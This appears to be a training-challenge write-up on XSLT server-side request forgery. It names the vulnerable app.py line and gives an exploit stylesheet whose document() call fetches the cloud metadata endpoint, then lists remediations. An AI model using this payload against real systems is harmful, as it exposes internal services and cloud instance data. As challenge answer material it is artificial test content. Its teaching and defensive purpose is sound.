# Challenge 24: XSLT Server-Side Request Forgery (SSRF)

## Vulnerability
The application allows users to upload XSLT files which are then processed server-side. XSLT processors can be abused to perform SSRF attacks using the `document()` function to fetch external resources.

## Location
`app.py` line 18: `transformer = xsltproc.compile_stylesheet(stylesheet_text=xslt_content.decode())`

## Impact
- Server-Side Request Forgery to internal services
- Information disclosure from internal network
- Potential XML External Entity (XXE) attacks
- File system access in some configurations

## Exploitation
Upload an XSLT file containing:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:variable name="ssrf" select="document('http://169.254.169.254/latest/meta-data/instance-id')"/>
    <result><xsl:copy-of select="$ssrf"/></result>
  </xsl:template>
</xsl:stylesheet>
```

## Remediation
1. Disable external entity resolution in the XSLT processor
2. Use a whitelist of allowed functions and disable `document()`
3. Run XSLT processing in a sandboxed environment
4. Validate and sanitize XSLT content before processing
